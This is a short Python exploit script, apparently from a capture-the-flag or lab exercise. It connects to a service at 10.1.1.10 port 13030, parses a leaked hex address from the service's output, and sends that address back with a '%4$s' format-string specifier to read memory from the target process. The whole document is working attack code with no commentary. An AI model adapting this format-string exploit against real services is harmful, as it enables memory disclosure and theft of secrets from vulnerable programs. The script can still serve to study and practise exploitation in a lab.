import re
import socket

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(("10.1.1.10", 13030))
c.settimeout(1)

leak = b"[0x00000000] ;("
try:
    leak = c.recv(256) + c.recv(256) + c.recv(256)
except:
    pass
leak = re.search("\[0x(.*)\]", leak.decode()).group(1)
print(leak)

payload = bytes.fromhex(leak)[::-1] + b"%4$s" + b"\n"
c.send(payload)
print(payload)

print(c.recv(256))